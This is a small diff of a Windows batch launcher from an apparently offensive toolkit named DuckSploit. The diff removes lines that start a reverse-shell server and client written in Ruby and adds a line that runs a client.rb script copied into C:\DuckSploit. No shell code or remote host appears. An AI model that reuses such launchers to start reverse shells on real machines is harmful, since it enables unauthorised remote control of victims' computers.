@@ -6,9 +6,6 @@ copy commands\*.* C:\DuckSploit\ruby\
 
 cls
 
-start cmd.exe /C "ruby E:\DUCKSPLOIT\ruby\reverse_shell\server.rb&pause"
-
-start cmd.exe /C "ruby E:\DUCKSPLOIT\ruby\reverse_shell\client.rb&pause"
-
+start cmd.exe /C "ruby C:\DuckSploit\scripts\ruby\client.rb"
 
 exit
